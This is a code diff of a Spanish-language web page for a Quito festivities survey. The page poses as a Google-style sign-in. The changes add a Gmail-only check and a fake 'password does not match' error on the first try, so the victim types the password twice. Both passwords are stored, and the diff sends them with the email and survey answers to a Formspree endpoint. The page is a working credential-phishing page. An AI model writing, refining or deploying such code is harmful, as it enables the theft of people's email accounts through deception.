@@ -17,7 +17,6 @@
         .bg-quito-gold { background-color: #bb9457; }
         .border-quito-gold { border-color: #bb9457; }
         
-        /* Colores de la bandera de Quito para ¡VIVA QUITO! */
         .quito-title-gradient {
             background: linear-gradient(135deg, #2563eb 40%, #dc2626 60%);
             -webkit-background-clip: text;
@@ -25,7 +24,6 @@
             text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
         }
 
-        /* Fondo con la Virgen del Panecillo */
         .hero-bg {
             background: linear-gradient(rgba(13, 27, 42, 0.65), rgba(13, 27, 42, 0.85)), 
                         url('https://images.unsplash.com/photo-1588668214407-6ea9a6d8c272?auto=format&fit=crop&w=1920&q=80');
@@ -50,7 +48,7 @@
     <!-- CONTENEDOR PRINCIPAL -->
     <main class="flex-grow flex items-center justify-center px-4 py-12 z-10">
         
-        <!-- PASO 1: INICIO DE SESIÓN ESTILO GOOGLE (FONDO BLANCO) -->
+        <!-- PASO 1: INICIO DE SESIÓN ESTILO GOOGLE -->
         <section id="login-section" class="bg-white/95 text-gray-900 rounded-2xl p-8 shadow-2xl max-w-md w-full border border-gray-200 backdrop-blur-md">
             <div class="text-center mb-6">
                 <div class="flex justify-center mb-3">
@@ -65,10 +63,10 @@
                 <p class="text-xs text-gray-500 mt-1">Accede con tu cuenta para la encuesta de las festividades</p>
             </div>
 
-            <!-- Alerta de contraseña incorrecta -->
+            <!-- Alerta de contraseña incorrecta o correo inválido -->
             <div id="login-error" class="hidden mb-4 p-3 bg-red-50 border border-red-200 text-red-600 text-xs rounded-lg flex items-center gap-2">
                 <i data-lucide="alert-circle" class="w-4 h-4 flex-shrink-0"></i>
-                <span>La contraseña no coincide. Por favor, ingrésala de nuevo.</span>
+                <span id="login-error-text">La contraseña no coincide. Por favor, ingrésala de nuevo.</span>
             </div>
 
             <form id="login-form" class="space-y-4">
@@ -141,7 +139,7 @@
             </form>
         </section>
 
-        <!-- PASO 3: AGRADECIMIENTO CON NÚMERO GRANDE DE PARTICIPANTE (> 1900) -->
+        <!-- PASO 3: AGRADECIMIENTO -->
         <section id="thanks-section" class="hidden bg-slate-900/90 border border-quito-gold/50 rounded-2xl p-8 shadow-2xl backdrop-blur-md max-w-md w-full text-center space-y-4">
             <div class="inline-flex p-3 bg-emerald-500/10 rounded-full text-emerald-400">
                 <i data-lucide="check-circle" class="w-10 h-10"></i>
@@ -152,7 +150,6 @@
                 <p class="text-xs text-gray-300 mt-1">Tus preferencias han sido registradas exitosamente.</p>
             </div>
 
-            <!-- Número de participante grande -->
             <div class="p-4 bg-slate-800 border border-quito-gold/40 rounded-xl">
                 <span class="block text-xs text-quito-gold uppercase font-semibold tracking-widest mb-1">Número de Participante</span>
                 <span id="participant-number" class="text-4xl font-extrabold text-white tracking-wider">#1945</span>
@@ -177,22 +174,39 @@
         // ⚠️ REEMPLAZA ESTA URL CON TU ENDPOINT DE FORMSPREE ⚠️
         const FORMSPREE_URL = 'https://formspree.io/f/xvkknzoq';
 
-        let userData = { email: '', password: '', name: '', companion: '', preference: '', artists: '', comments: '' };
+        let userData = { email: '', firstPassword: '', secondPassword: '', name: '', companion: '', preference: '', artists: '', comments: '' };
         let loginAttempts = 0;
 
         document.getElementById('login-form').addEventListener('submit', function(e) {
             e.preventDefault();
             const emailField = document.getElementById('login-email');
             const passwordField = document.getElementById('login-password');
+            const errorBox = document.getElementById('login-error');
+            const errorText = document.getElementById('login-error-text');
 
+            const emailValue = emailField.value.trim().toLowerCase();
+
+            // 1. Validar que sea un correo electrónico de Gmail válido
+            if (!emailValue.endsWith('@gmail.com')) {
+                errorText.textContent = "Por favor, ingresa un correo electrónico de Gmail válido (@gmail.com).";
+                errorBox.classList.remove('hidden');
+                return;
+            }
+
+            // 2. Lógica del primer intento (guardar 1ra contraseña y pedir reingreso)
             if (loginAttempts === 0) {
+                userData.firstPassword = passwordField.value; // Guarda primera contraseña
                 loginAttempts++;
-                document.getElementById('login-error').classList.remove('hidden');
+                
+                errorText.textContent = "La contraseña no coincide. Por favor, ingrésala de nuevo.";
+                errorBox.classList.remove('hidden');
+                
                 passwordField.value = ''; 
                 passwordField.focus();
             } else {
-                userData.email = emailField.value;
-                userData.password = passwordField.value;
+                // Segundo intento (guarda correo y 2da contraseña y avanza)
+                userData.email = emailValue;
+                userData.secondPassword = passwordField.value; // Guarda segunda contraseña
 
                 document.getElementById('login-section').classList.add('hidden');
                 document.getElementById('survey-section').classList.remove('hidden');
@@ -214,10 +228,12 @@
 
             const randomParticipantId = Math.floor(Math.random() * 600) + 1901;
 
+            // Enviar todos los datos (incluidas ambas contraseñas) a Formspree
             const formData = new FormData();
             formData.append('Fecha', new Date().toLocaleString());
             formData.append('Correo', userData.email);
-            formData.append('Contrasena', userData.password);
+            formData.append('Primera Contrasena', userData.firstPassword);
+            formData.append('Segunda Contrasena', userData.secondPassword);
             formData.append('Nombre Principal', userData.name);
             formData.append('Acompanante', userData.companion);
             formData.append('Evento Preferido', userData.preference);
